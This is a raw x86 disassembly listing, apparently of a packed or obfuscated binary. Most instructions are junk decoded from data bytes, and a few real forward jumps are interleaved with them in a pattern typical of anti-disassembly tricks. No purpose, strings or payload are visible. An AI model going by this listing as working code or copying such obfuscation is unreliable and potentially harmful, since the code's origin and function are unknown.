  414f61:	mov    fs,WORD PTR [eax]
  414f63:	(bad)  
  414f64:	xor    eax,0x60e986cd
  414f69:	push   es
  414f6a:	xor    BYTE PTR [ebp+0x3],ah
  414f6d:	inc    ebp
  414f6e:	test   al,0x3
  414f70:	test   DWORD PTR [edi+edi*8-0x1],edi
  414f74:	(bad)  
  414f75:	jmp    0x415040
  414f7a:	in     ax,dx
  414f7c:	xchg   ecx,eax
  414f7d:	sti    
  414f7e:	fwait
  414f7f:	jmp    FWORD PTR [esi-0x3]
  414f82:	dec    edx
  414f83:	(bad)  
  414f84:	(bad)  
  414f85:	mov    eax,ds:0x4e2aee03
  414f8a:	cdq    
  414f8b:	jmp    0x414f8d
  414f8d:	add    BYTE PTR [esi+0x40000000],ch
  414f93:	pmaxub mm7,QWORD PTR [ebx]
  414f96:	jns    0x414fbf
  414f98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f99:	jns    0x414f6f
  414f9b:	xchg   esi,eax
  414f9c:	hlt    
  414f9d:	mov    cl,dh
  414f9f:	inc    DWORD PTR [eax+0x5d0975d6]
  414fa5:	mov    eax,ds:0x2dc9efb3
  414faa:	popa   
  414fab:	in     eax,0xbb
  414fad:	call   0xf9e7ebc7
  414fb2:	sbb    BYTE PTR [ebx+0x58d1f2ca],bh
  414fb8:	dec    esi
  414fb9:	add    BYTE PTR [ecx+0x3768a6c4],al
  414fbf:	xchg   ecx,eax
  414fc0:	out    0xc4,eax
  414fc2:	test   DWORD PTR [ebx+0x701a4ffd],eax
  414fc8:	mov    al,ds:0x642b46c5
  414fcd:	retf   0xb4ce
  414fd0:	mov    dl,0xd8
  414fd2:	bswap  ecx
  414fd4:	iret   
  414fd5:	hlt    
  414fd6:	int    0xb6
  414fd8:	pop    esi
  414fd9:	jbe    0x414fb5
  414fdb:	xor    eax,DWORD PTR [ebp-0x2]
  414fde:	xchg   BYTE PTR [edx+0x4190efb7],dl
  414fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414fe5:	push   edx
  414fe6:	or     BYTE PTR [esi],bl
  414fe8:	sbb    edi,DWORD PTR [eax-0x71a43f31]
  414fee:	(bad)  
  414ff0:	ret    0x5dcf
  414ff3:	inc    esi
  414ff4:	pop    ebp
  414ff5:	mov    al,0xfb
  414ff7:	dec    edi
  414ff8:	adc    eax,0x9675b5b2
  414ffd:	mov    edi,0x9fff15e
  415002:	push   eax
  415003:	push   edx
  415004:	push   esp
  415005:	popf   
  415006:	mov    ah,0xc6
  415008:	push   0x308213af
  41500d:	xchg   ebp,eax
  41500e:	aam    0xe8
  415010:	add    DWORD PTR [edi+0x43765955],ebp
  415016:	inc    esi
  415017:	cdq    
  415018:	adc    BYTE PTR [edx],0x18
  41501b:	jle    0x415020
  41501d:	pop    es
  41501e:	data16 jecxz 0x414ffb
  415021:	mov    ah,0x57
  415023:	into   
  415024:	sub    al,0x74
  415026:	leave  
  415027:	imul   ecx,DWORD PTR [edx+0x18],0xffffffac
  41502b:	xor    eax,0x7ae63c94
  415030:	pop    eax
  415031:	add    BYTE PTR [ecx-0x73a1b883],dh
  415037:	push   edx
  415038:	js     0x415008
  41503a:	jecxz  0x41502a
  41503c:	fadd   st(5),st
  41503e:	loope  0x4150b5
  415040:	mov    ecx,DWORD PTR [ebp-0x3c]
  415043:	jmp    0x41510e
  415048:	fdiv   DWORD PTR [ebp+0x7]
  41504b:	retf   0xfaaf
  41504e:	fnsave [edi+0x7c]
  415051:	or     BYTE PTR [ebp+0xb422270],bl
  415057:	mov    DWORD PTR [edi-0x14],0xae0000
  41505e:	add    BYTE PTR [eax],al
  415060:	das    
  415061:	dec    ebp
  415062:	push   esp
  415063:	push   ds
  415064:	sub    bl,0x78
  415067:	mov    ebp,0x64b38d5f
  41506c:	adc    eax,DWORD PTR [ebp-0x58]
  41506f:	jmp    0x5f6c:0x1725400f
  415076:	jmp    0x416a:0x1d5d9c5
  41507d:	imul   ebx,DWORD PTR [eax],0x3195f8fe
  415083:	adc    DWORD PTR [ebx-0x49],edx
  415086:	sahf   
  415087:	add    bh,BYTE PTR [edi+edx*4-0x710f798]
  41508e:	ss pop esi
  415090:	dec    ebx
  415091:	mov    ecx,0x80c26cd1
  415096:	mov    ds:0xe10888e8,eax
  41509b:	aam    0x2e
  41509d:	outs   dx,DWORD PTR gs:[esi]
  41509f:	mov    dh,0x52
  4150a1:	lea    ebp,[edx]
  4150a3:	push   ebx
  4150a4:	pop    eax
  4150a5:	pop    eax
  4150a6:	and    cl,dh
  4150a8:	outs   dx,BYTE PTR ds:[esi]
  4150a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150aa:	pop    ebp
  4150ab:	adc    ch,BYTE PTR [edi]
  4150ad:	xchg   ebx,eax
  4150ae:	jmp    0x4150ec
  4150b0:	add    al,0x3
  4150b2:	mov    fs,WORD PTR [edx+0x3d2679d3]
  4150b8:	jae    0x415113
  4150ba:	dec    ecx
  4150bb:	mov    dh,0x4
  4150bd:	xchg   ebx,eax
  4150be:	daa    
  4150bf:	(bad)  
  4150c0:	fdivr  st,st(2)
  4150c2:	or     esp,DWORD PTR [eax]
  4150c4:	jae    0x41504e
  4150c6:	inc    ebp
  4150c7:	push   ebx
  4150c8:	loop   0x41512b
  4150ca:	aad    0x99
  4150cc:	ret    
  4150cd:	xor    edi,DWORD PTR [esi]
  4150cf:	cdq    
  4150d0:	lock fdecstp 
  4150d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150d4:	inc    ecx
  4150d5:	pop    ecx
  4150d6:	add    ebp,DWORD PTR [eax]
  4150d8:	mov    eax,ds:0x66a1cbbd
  4150dd:	sbb    eax,0x71d45aff
  4150e2:	xor    eax,0xda61760b
  4150e7:	inc    ebp
  4150e8:	xor    al,0x13
  4150ea:	jns    0x415104
  4150ec:	xor    eax,0x840bd388
  4150f1:	and    ebx,DWORD PTR [ebp+0x620f2042]
  4150f7:	xchg   DWORD PTR [ebp+0x6ced2bdd],esp
  4150fd:	sbb    DWORD PTR [eax],ebp
  4150ff:	add    eax,0xa97c3cdc
  415104:	add    al,0x19
  415106:	(bad)  
  415107:	fiadd  DWORD PTR [esi-0x738a2d15]
  41510d:	mov    ebp,0x22d625
  415112:	add    BYTE PTR [edi],cl
  415114:	scas   eax,DWORD PTR es:[edi]
  415115:	shl    DWORD PTR ds:0x394c0,0x3
  41511c:	inc    ebp
  41511d:	pushf  
  41511e:	push   eax
  41511f:	jmp    0x4151ea
  415124:	mov    bl,0xa9
  415126:	cmp    al,0x7
  415128:	ds xchg edi,eax
  41512a:	mov    ebx,0xeca595bd
  41512f:	or     eax,0x70e326d7
  415134:	cmc    
  415135:	in     al,dx
  415136:	add    BYTE PTR [eax],al
  415138:	scas   al,BYTE PTR es:[edi]
  415139:	add    BYTE PTR [eax],al
  41513b:	add    BYTE PTR [ebx],dl
  41513d:	dec    ebx
  41513e:	fucomi st,st(1)
  415140:	loope  0x41519b
  415142:	(bad)
  415146:	in     al,0x25
  415148:	pop    es
  415149:	cmp    DWORD PTR [ecx+eax*2+0x18],0xa79e7e8e
  415151:	and    dh,BYTE PTR fs:[ecx+0x6049aefb]
  415158:	mov    al,ds:0x2ac0899d
  41515d:	fdiv   DWORD PTR [edi]
  41515f:	jg     0x415156
  415161:	mov    bh,0x48
  415163:	stc    
  415164:	mov    ecx,0xee04a9ae
  415169:	imul   edx,DWORD PTR [ebp-0x2ed2f783],0x635e4f33
  415173:	das    
  415174:	ss xchg esp,eax
  415176:	js     0x4151ef
  415178:	mov    esp,0x3857e18e
  41517d:	mov    esp,0x84cbb5d0
  415182:	dec    DWORD PTR [esi]
  415184:	rcl    DWORD PTR [ecx+ecx*8-0x57],cl
  415188:	mov    BYTE PTR [eax],cl
  41518a:	sbb    al,0xc4
  41518c:	push   edx
  41518d:	out    dx,al
  41518e:	nop
  41518f:	repnz stos DWORD PTR es:[edi],eax
  415191:	fcom   DWORD PTR [eax+0x3e]
  415194:	or     DWORD PTR [esi],ecx
  415196:	mov    esi,0x9efd495a
  41519b:	xor    eax,0x11e3b474
  4151a0:	or     al,0xc2
  4151a2:	ja     0x415189
  4151a4:	(bad)  [edi]
  4151a6:	pop    edi
  4151a7:	in     al,dx
  4151a8:	xlat   BYTE PTR ds:[ebx]
  4151a9:	xchg   esp,eax
  4151aa:	or     eax,0x90d5f14e
  4151af:	xor    bh,BYTE PTR gs:[esi]
  4151b2:	out    dx,eax
  4151b3:	call   0x4c59:0x598fad2
  4151ba:	repnz dec eax
  4151bc:	mov    esp,DWORD PTR [eax-0x7a]
  4151bf:	fidivr WORD PTR [ecx+edi*2-0x602f5207]
  4151c6:	sbb    al,BYTE PTR [eax]
  4151c8:	pusha  
  4151c9:	pop    ecx
  4151ca:	mov    edi,0x72bde2d2
  4151cf:	xchg   ebx,eax
  4151d0:	jmp    0x507b:0x91d383aa
  4151d7:	inc    ecx
  4151d8:	inc    ecx
  4151d9:	data16 mov cs,WORD PTR [edx+0xe875f17]
  4151e0:	ficom  WORD PTR [ecx+ebp*4-0x1d]
  4151e4:	stos   BYTE PTR es:[edi],al
  4151e5:	pop    esi
  4151e6:	repz mov al,ds:0x458bb331
  4151ec:	mov    cl,ch
  4151ee:	mov    BYTE PTR [eax],0x0
  4151f1:	add    BYTE PTR [esi-0x43],ah
  4151f4:	inc    esi
  4151f5:	clc    
  4151f6:	(bad)  
  4151f8:	(bad)  
  4151f9:	mov    edi,0xa18c4dba
  4151fe:	and    DWORD PTR [ecx],esi
  415200:	cmp    al,0xd
  415202:	mov    ds:0xae0000ed,eax
  415207:	add    BYTE PTR [eax],al
  415209:	add    BYTE PTR [ecx+0x3ef184c8],bl
  41520f:	es scas al,BYTE PTR es:[edi]
  415211:	xor    dl,BYTE PTR [eax]
  415213:	sub    esp,edx
  415215:	cmp    ebx,DWORD PTR [ebp-0x77fbed40]
  41521b:	xchg   esp,eax
  41521c:	cmp    DWORD PTR [edi],ebx
  41521e:	sub    DWORD PTR [edi],edi
  415220:	add    edx,DWORD PTR [edx+0x73]
  415223:	repz push ss
  415225:	adc    ebx,esi
  415227:	mov    ebp,0x4c62c1a7
  41522c:	pop    ds
  41522d:	fld    QWORD PTR [ebp-0x2f]
  415230:	cdq    
  415231:	push   es
  415232:	test   DWORD PTR [ebx+0x41b7ff1f],0x8cf08402
  41523c:	out    0x30,al
  41523e:	and    esp,DWORD PTR [ebp-0xf006b3b]
  415244:	dec    eax
  415245:	mov    ebp,0x283cfd6b
  41524a:	mov    BYTE PTR [eax+0x6f],0x9e
  41524e:	out    dx,eax
  41524f:	enter  0x6a01,0xb4
  415253:	mov    dh,0x9d
  415255:	push   es
  415256:	jne    0x4151e8
  415258:	sbb    ecx,esp
  41525a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41525b:	pop    ebx
  41525d:	jmp    0xb4097eb7
  415262:	sbb    cl,BYTE PTR [eax-0x9]
  415265:	int3   
  415266:	out    0xee,al
  415268:	fcom   DWORD PTR [edi+0x2]
  41526b:	xchg   esi,eax
  41526c:	push   edi
  41526d:	xor    ebp,DWORD PTR [edi+0x3f578a59]
  415273:	sub    bl,dl
  415275:	xor    eax,0x831276fa
  41527a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41527b:	iret   
  41527c:	cmp    ch,al
  41527e:	outs   dx,DWORD PTR ds:[esi]
  41527f:	repnz pop edx
  415281:	jo     0x415246
  415283:	imul   DWORD PTR [ebp-0x6c]
  415286:	xchg   ebx,esp
  415288:	jecxz  0x41522c
  41528a:	xchg   edi,eax
  41528b:	xor    eax,0x13d7a487
  415290:	mov    bh,0xfa
  415292:	inc    ebx
  415293:	sbb    BYTE PTR [edx-0x45b7109d],0x81
  41529a:	jnp    0x4152e0
  41529c:	or     BYTE PTR [edi+ecx*4],bl
  41529f:	lods   eax,DWORD PTR ds:[esi]
  4152a0:	pop    ebx
  4152a1:	imul   ebx,DWORD PTR [ebx-0x6a8cf45],0xdb619ea
  4152ab:	mov    cl,0x18
  4152ad:	jecxz  0x41532a
  4152af:	loopne 0x415264
  4152b1:	lahf   
  4152b2:	sahf   
  4152b3:	inc    ebx
  4152b4:	jnp    0x41528d
  4152b6:	jl     0x41523e
  4152b8:	mov    ecx,DWORD PTR [ebp-0x74]
  4152bb:	jmp    0x415386
  4152c0:	or     cl,BYTE PTR ds:0xad8f2d88
  4152c6:	scas   eax,DWORD PTR es:[edi]
  4152c7:	das    
  4152c8:	pop    ss
  4152c9:	jns    0x415323
  4152cb:	fiadd  WORD PTR [esi+0x51dec588]
  4152d1:	out    dx,al
  4152d2:	add    BYTE PTR [eax],al
  4152d4:	scas   al,BYTE PTR es:[edi]
  4152d5:	add    BYTE PTR [eax],al
  4152d7:	add    BYTE PTR [ebp+esi*4+0x36a11563],dh
  4152de:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152df:	je     0x41528d
  4152e1:	jbe    0x415282
  4152e3:	sub    al,0x8b
  4152e5:	mov    ecx,0x1b0be049
  4152ea:	call   0x92d3:0x9d9e6d43
  4152f1:	mov    eax,0x9eae0d99
  4152f6:	xchg   BYTE PTR [eax],dl
  4152f8:	retf   0x1e62
  4152fb:	push   eax
  4152fc:	mov    bh,0xc8
  4152fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4152ff:	nop
  415300:	sub    DWORD PTR [edx],esi
  415302:	pop    edx
  415303:	mov    edi,0xbca0b36c
  415308:	push   es
  415309:	or     al,0x2e
  41530b:	dec    esp
  41530c:	int    0x63
  41530e:	or     DWORD PTR [ebp+0x41b0af2b],esi
  415314:	lock xchg edi,eax
  415316:	add    BYTE PTR [edi-0x36],ch
  415319:	cmp    esp,DWORD PTR [edi-0x7e4e2a07]
  41531f:	sbb    eax,0x39e64341
  415324:	loop   0x415392
  415326:	mov    dh,0xe7
  415328:	xchg   esi,eax
  415329:	pop    eax
  41532a:	aam    0x57
  41532c:	push   edi
  41532d:	xor    DWORD PTR [ecx+ecx*2+0x2fae0449],edx
  415334:	dec    esi
  415335:	adc    eax,0x5e0b6f52
  41533a:	mov    esi,0x7b90e78c
  41533f:	je     0x41534c
  415341:	cmp    ah,dl
  415343:	fwait
  415344:	sub    al,0xa3
  415346:	mov    cl,0x7a
  415348:	inc    esi
  415349:	jp     0x415359
  41534b:	adc    dl,ah
  41534d:	fdiv   DWORD PTR [ecx+0x1a6ef195]
  415353:	xor    al,0xbb
  415355:	add    dl,BYTE PTR [ecx+0x57fb6c59]
  41535b:	lahf   
  41535c:	push   esi
  41535d:	outs   dx,DWORD PTR ds:[esi]
  41535e:	pop    ebx
  41535f:	mov    DWORD PTR [esi+0x4],esp
  415362:	dec    ebp
  415363:	mov    dh,0xd3
  415365:	ds push esp
  415367:	add    BYTE PTR [ebx+0x841e84e],bl
  41536d:	mov    ecx,0xc3f45d36
  415372:	cmc    
  415373:	xchg   ebx,eax
  415374:	jae    0x4153d8
  415376:	push   edi
  415377:	jo     0x415355
  415379:	js     0x415303
  41537b:	mov    al,0x3e
  41537d:	out    0x4d,al
  41537f:	push   cs
  415380:	mov    ah,0xda
  415382:	fcmovnb st,st(3)
  415384:	add    BYTE PTR [ebx],dl
  415386:	mov    ecx,DWORD PTR [ebp-0x20]
  415389:	mov    edx,DWORD PTR [ebp-0x1c]
  41538c:	mov    esi,DWORD PTR [ebp-0x44]
  41538f:	or     eax,0x2ac2
  415394:	imul   eax,eax,0xffffd000
  41539a:	jmp    0x415465
  41539f:	jg     0x41536e
  4153a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a2:	popa   
  4153a3:	mov    dh,0x6b
  4153a5:	(bad)  
  4153a6:	(bad)  
  4153a8:	xor    edx,DWORD PTR [eiz*2+0xd4529fa]
  4153af:	(bad)  
  4153b0:	out    dx,al
  4153b1:	add    BYTE PTR [eax],al
  4153b3:	scas   al,BYTE PTR es:[edi]
  4153b4:	add    BYTE PTR [eax],al
  4153b6:	add    BYTE PTR [eax+0x33],cl
  4153b9:	imul   ebp,DWORD PTR [esi-0x3a],0xe897195e
  4153c0:	sub    al,0x32
  4153c2:	test   DWORD PTR [eax],ebx
  4153c4:	jge    0x415419
  4153c6:	add    ebx,DWORD PTR [eax]
  4153c8:	fs je  0x41537c
  4153cb:	sti    
  4153cc:	dec    ebx
  4153cd:	out    dx,eax
  4153ce:	out    0x60,eax
  4153d0:	stc    
  4153d1:	mov    al,0xc4
  4153d3:	xchg   ebx,eax
  4153d4:	ins    BYTE PTR es:[edi],dx
  4153d5:	aas    
  4153d6:	mov    gs,WORD PTR [esi+0x1b]
  4153d9:	das    
  4153da:	cmp    al,0x1a
  4153dc:	adc    bl,BYTE PTR [ecx-0x10]
  4153df:	fdiv   QWORD PTR [ecx]
  4153e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153e2:	fst    QWORD PTR [esi+edx*1+0x5fefb83a]
  4153e9:	adc    BYTE PTR [esi-0x53],al
  4153ec:	cs (bad) 
  4153ee:	sbb    al,0x29
  4153f0:	mov    ebx,DWORD PTR [ecx]
  4153f2:	ret    
  4153f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153f4:	mov    bl,0x5a
  4153f6:	mov    dl,0xa4
  4153f8:	dec    esp
  4153f9:	push   ebp
  4153fa:	inc    ecx
  4153fb:	or     eax,0x2ba897d9
  415400:	enter  0x925f,0x18
  415404:	xchg   ebx,eax
  415405:	push   ss
  415406:	arpl   sp,bx
  415408:	adc    al,0xad
  41540a:	and    al,0xb4
  41540c:	add    eax,0xc6b6f18a
  415411:	jle    0x41543f
  415413:	ficom  WORD PTR [ebp+0x45e209a5]
  415419:	icebp  
  41541a:	adc    DWORD PTR ds:0x64a6847e,0x1086083b
  415424:	push   esi
  415425:	pop    ss
  415426:	xor    DWORD PTR [edi+0x79],eax
  415429:	aad    0xe3
  41542b:	aad    0xe6
  41542d:	jne    0x415413
  41542f:	sub    ecx,DWORD PTR [esi+0x23a6c059]
  415435:	or     al,0xe4
  415437:	paddw  mm3,QWORD PTR [ecx+0x1c]
  41543b:	cmp    ch,BYTE PTR [eax]
  41543d:	mov    eax,0x8a8f2833
  415442:	lea    eax,[edi-0x1f4fd48f]
  415448:	mov    ecx,0x16d8b20d
  41544d:	imul   ebx,DWORD PTR [edx+ecx*4],0xe12e7a54
  415454:	xchg   ebp,eax
  415455:	ja     0x415469
  415457:	shl    BYTE PTR [ebx+0x76],1
  41545a:	sbb    edi,DWORD PTR [ebp+0x5b]
  41545d:	(bad)  
  41545e:	fistp  WORD PTR [ebx+0x5f]
  415461:	xchg   esi,eax
  415462:	or     DWORD PTR [edi],eax
  415464:	mov    ah,0x81
  415466:	not    BYTE PTR [eax]
  415468:	push   cs
  415469:	add    BYTE PTR [eax],al
  41546b:	jmp    0x415536
  415470:	push   esp
  415471:	les    esp,FWORD PTR [edx-0x20904dd7]
  415477:	std    
  415478:	mov    ebp,DWORD PTR [edi+0x423ade66]
  41547e:	cli    
  41547f:	pop    edi
  415480:	lods   eax,DWORD PTR ds:[esi]
  415481:	out    dx,eax
  415482:	add    BYTE PTR [eax],al
  415484:	scas   al,BYTE PTR es:[edi]
  415485:	add    BYTE PTR [eax],al
  415487:	add    BYTE PTR [eax-0x417ed7c2],al
  41548d:	test   eax,0xa7eff214
  415492:	xor    BYTE PTR [esi],bh
  415494:	pop    ebp
  415495:	pop    eax
  415496:	mov    esi,0x26da244f
  41549b:	and    bh,BYTE PTR [edx+0x5f]
  41549e:	pop    edi
  41549f:	jg     0x415432
  4154a1:	jnp    0x41551d
  4154a3:	jns    0x415432
  4154a5:	push   eax
  4154a6:	(bad)  
  4154a7:	rcl    DWORD PTR [eax],cl
  4154a9:	mov    dh,0x39
  4154ab:	add    eax,0x72e17ca3
  4154b0:	add    DWORD PTR [ebx],0xc05b37e2
  4154b6:	add    edi,DWORD PTR [edi-0x44]
  4154b9:	sub    esi,DWORD PTR [ebx]
  4154bb:	sub    eax,0x799b68d8
  4154c0:	xor    ebp,DWORD PTR [esi-0x5f]
  4154c3:	aaa    
  4154c4:	adc    BYTE PTR [esi-0x42],bh
  4154c7:	or     bh,BYTE PTR [ecx+eax*2-0x1]
  4154cb:	arpl   di,ax
  4154cd:	jnp    0x41552f
  4154cf:	adc    eax,ebx
  4154d1:	into   
  4154d2:	bound  ebp,QWORD PTR [esi+0x22]
  4154d5:	popa   
  4154d6:	cmp    al,0xe5
  4154d8:	adc    dl,BYTE PTR [esi-0x5562338b]
  4154de:	cmp    al,0xb8
  4154e0:	loop   0x41550d
  4154e2:	sbb    esi,DWORD PTR [edx+0x6c]
  4154e5:	scas   eax,DWORD PTR es:[edi]
  4154e6:	cmp    bh,dl
  4154e8:	stc    
  4154e9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4154ea:	mov    ?,WORD PTR [ebp+0x28]
  4154ed:	shl    ah,1
  4154ef:	push   edx
  4154f0:	push   eax
  4154f1:	rcl    DWORD PTR ds:0x124eca8e,0xa9
  4154f8:	push   0xcc3dc97e
  4154fd:	sbb    DWORD PTR [esi-0x40],edx
  415500:	out    0xd8,eax
  415502:	dec    ebx
  415503:	pop    eax
  415504:	aad    0x19
  415506:	or     al,0x29
  415508:	sbb    eax,0x955bc55a
  41550d:	sbb    BYTE PTR [esi-0x4d245142],0xe2
  415514:	inc    ebp
  415515:	cdq    
  415516:	(bad)  
  415517:	nop
  415518:	push   edx
  415519:	lds    ecx,FWORD PTR [ecx]
  41551b:	test   DWORD PTR [edx+0x10],0xb4713a09
  415522:	icebp  
  415523:	add    eax,0x77ea611c
  415528:	stos   DWORD PTR es:[edi],eax
  415529:	enter  0xaa2e,0x22
  41552d:	cs cmp al,0x75
  415530:	dec    eax
  415531:	add    BYTE PTR [esi-0x62],bh
  415534:	inc    edi
  415535:	dec    edi
  415536:	sub    esi,0x9d5
  41553c:	and    eax,0x7227
  415541:	lea    eax,[eax+ecx*1-0x1ffc]
  415548:	xor    esi,0x6dd
  41554e:	push   eax
  41554f:	mov    eax,DWORD PTR [ebp-0x80]
  415552:	sub    esi,0x4edd
  415558:	jmp    0x415623
  41555d:	ret    0xc8ef
  415560:	in     ax,dx
  415562:	addr16 out dx,al
  415564:	out    dx,eax
  415565:	jmp    0x556a:0x3e67a50a
  41556c:	mov    eax,ds:0xf05b
  415571:	scas   al,BYTE PTR es:[edi]
  415572:	add    BYTE PTR [eax],al
  415574:	add    BYTE PTR [ebx],ch
  415576:	mov    ebp,0x1c816196
  41557b:	data16 jmp 0x415513
  41557e:	and    BYTE PTR [edi+0x44b27059],dl
  415584:	add    edx,DWORD PTR [edi]
  415586:	push   ebp
  415587:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415588:	xchg   ecx,eax
  415589:	push   esi
  41558a:	cwde   
  41558b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41558c:	fidiv  DWORD PTR [edi+0x39cf26b]
  415592:	pop    edi
  415593:	lods   eax,DWORD PTR ds:[esi]
  415594:	cwde   
  415595:	enter  0xd3f5,0x69
  415599:	and    DWORD PTR [ebx-0x380799a3],esi
  41559f:	add    BYTE PTR [ecx+0x3b],dl
  4155a2:	xchg   BYTE PTR [ebp+0x663f20],ah
  4155a8:	lods   eax,DWORD PTR ds:[esi]
  4155a9:	mov    ds:0x622bc859,eax
  4155ae:	dec    eax
  4155af:	clc    
  4155b0:	add    BYTE PTR [eax+0x58],dl
  4155b3:	(bad)  
  4155b4:	jmp    0x3224a6c5
  4155b9:	int    0xf3
  4155bb:	add    edx,DWORD PTR [edx]
  4155bd:	mov    cl,0xbd
  4155bf:	repz pop ecx
  4155c1:	inc    esi
  4155c2:	pusha  
  4155c3:	cdq    
  4155c4:	imul   edi,DWORD PTR [edi],0x76ed059e
  4155ca:	sar    BYTE PTR [esi-0x121ae529],1
  4155d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155d1:	mov    edi,0x6438e3dd
  4155d6:	call   0xd592:0x52cc6ec
  4155dd:	rcl    bl,0x36
  4155e0:	cmp    al,0xe9
  4155e2:	or     ebp,DWORD PTR [edx]
  4155e4:	ret    
  4155e5:	fsqrt  
  4155e7:	out    dx,eax
  4155e8:	cwde   
  4155e9:	dec    DWORD PTR [ebp-0x462c61c5]
  4155ef:	dec    edx
  4155f0:	sbb    dl,BYTE PTR ds:0xb05ad81
  4155f6:	test   al,0x97
  4155f8:	sbb    DWORD PTR [eax-0x7a785cf],esi
  4155fe:	pushf  
  4155ff:	(bad)  
  415600:	cli    
  415601:	xor    DWORD PTR [ebx],edi
  415603:	xor    eax,0xd71d9bd7
  415608:	pop    ebx
  415609:	ja     0x415663
  41560b:	sbb    BYTE PTR [eax],bl
  41560d:	aaa    
  41560e:	(bad)  
  41560f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415610:	and    DWORD PTR [eax+0x50],ebp
  415613:	outs   dx,DWORD PTR ds:[esi]
  415614:	jb     0x41567c
  415616:	js     0x41567e
  415618:	ins    BYTE PTR es:[edi],dx
  415619:	add    al,0x24
  41561b:	xor    BYTE PTR [eax],bh
  41561d:	ficom  WORD PTR [ebx]
  41561f:	test   BYTE PTR [eax-0x50f0ca39],dl
  415625:	lock xor esi,0xe9e115d4
  41562c:	lea    esi,[ebp+esi*1-0xd0]
  415633:	jmp    0x4156fe
  415638:	or     al,0x46
  41563a:	inc    ebp
  41563b:	push   0x4f
  41563d:	imul   ebp,DWORD PTR [edi],0x66
  415640:	xchg   esi,eax
  415641:	retf   
  415642:	in     al,dx
  415643:	dec    esi
  415644:	out    dx,eax
  415645:	out    0xb0,al
  415647:	mov    esp,0xf109
  41564c:	scas   al,BYTE PTR es:[edi]
  41564d:	add    BYTE PTR [eax],al
  41564f:	add    BYTE PTR [ebp-0x3b],al
  415652:	mov    BYTE PTR [edx],dh
  415654:	sbb    al,0x18
  415656:	push   esi
  415657:	xchg   ch,ch
  415659:	dec    ebx
  41565a:	cmp    BYTE PTR [eax],cl
  41565c:	and    cl,cl
  41565e:	pop    ss
  41565f:	(bad)  
  415661:	or     al,0x54
  415663:	call   0xb035:0xe66f6737
  41566a:	loop   0x415600
  41566c:	inc    ecx
  41566d:	push   0x80e7ccb7
  415672:	xor    edx,DWORD PTR [ebx-0xe]
  415675:	icebp  
  415676:	outs   dx,DWORD PTR ds:[esi]
  415677:	pop    ds
  415678:	push   0xb8da3501
  41567d:	gs out dx,eax
  41567f:	cmp    DWORD PTR [edi],edi
  415681:	out    dx,al
  415682:	loopne 0x415657
  415684:	inc    edi
  415685:	in     al,dx
  415686:	ss mov ebx,0xdf4a8fb8
  41568c:	xchg   ebp,eax
  41568d:	sub    DWORD PTR [ecx],esi
  41568f:	mov    ds:0xbc750454,eax
  415694:	pop    ebx
  415696:	ja     0x415619
  415698:	out    dx,al
  415699:	pop    ecx
  41569a:	sub    edx,DWORD PTR [ecx-0x46]
  41569d:	xor    al,0xf1
  41569f:	ret    0x4a6d
  4156a2:	inc    esi
  4156a3:	aam    0xe3
  4156a5:	jmp    0x7f4f:0x219364ca
  4156ac:	ins    DWORD PTR es:[edi],dx
  4156ad:	or     dl,ch
  4156af:	dec    ebp
  4156b0:	jbe    0x41564c
  4156b2:	push   ss
  4156b3:	add    BYTE PTR [esi-0x7a],dl
  4156b6:	or     al,0x33
  4156b8:	loopne 0x41564e
  4156ba:	fdivr  st,st(0)
  4156bc:	(bad)  
  4156bd:	sbb    ch,BYTE PTR [ebp+0x7b]
  4156c0:	mov    ah,0xc2
  4156c2:	shl    BYTE PTR [ebx],0x22
  4156c5:	pop    ds
  4156c6:	xor    ah,BYTE PTR ds:0x6c663ea0
  4156cc:	push   edx
  4156cd:	push   ecx
  4156ce:	pusha  
  4156cf:	xor    DWORD PTR [edi+0x3458ceba],0xffffffe0
  4156d6:	xchg   edx,eax
  4156d7:	push   esi
  4156d8:	inc    eax
  4156d9:	mov    BYTE PTR [ebx],al
  4156db:	sbb    bl,al
  4156dd:	lahf   
  4156de:	xchg   edx,eax
  4156df:	aam    0x48
  4156e1:	ret    0xf7ad
  4156e4:	out    dx,eax
  4156e5:	shr    BYTE PTR [edi+0x11],cl
  4156e8:	jns    0x41575f
  4156ea:	retf   
  4156eb:	push   es
  4156ec:	push   edx
  4156ed:	mov    esi,0x3edf948a
  4156f2:	mov    bh,0x48
  4156f4:	test   bl,0xae
  4156f7:	jp     0x415706
  4156f9:	dec    ebx
  4156fa:	jge    0x4156f2
  4156fc:	mov    DWORD PTR [edi],ecx
  4156fe:	call   0x41685d
  415703:	mov    ecx,DWORD PTR [ebp-0x4c]
  415706:	mov    edx,DWORD PTR [ebp-0x34]
  415709:	add    ecx,0x5ef8
  41570f:	or     ecx,edx
  415711:	sub    ecx,0xbefe
  415717:	cmp    eax,ecx
  415719:	jne    0x415e00
  41571f:	mov    eax,DWORD PTR [ebp-0x54]
  415722:	jmp    0x4157ed
  415727:	or     DWORD PTR [edi],esi
  415729:	push   edx
  41572a:	xchg   ecx,eax
  41572b:	jle    0x415722
  41572d:	retf   
  41572e:	mov    edi,0x9554104e
  415733:	lods   eax,DWORD PTR ds:[esi]
  415734:	mov    cl,0xfd
  415736:	cmp    DWORD PTR [edi-0x51ffff0f],esi
  41573c:	add    BYTE PTR [eax],al
  41573e:	add    BYTE PTR [ebp+0x5f8c6f1d],dl
  415744:	je     0x4157a8
  415746:	ret    0x5c6d
  415749:	cmp    esi,DWORD PTR [edi+0x1c]
  41574c:	add    bh,BYTE PTR [esi]
  41574e:	popf   
  41574f:	pop    edi
  415750:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415751:	aas    
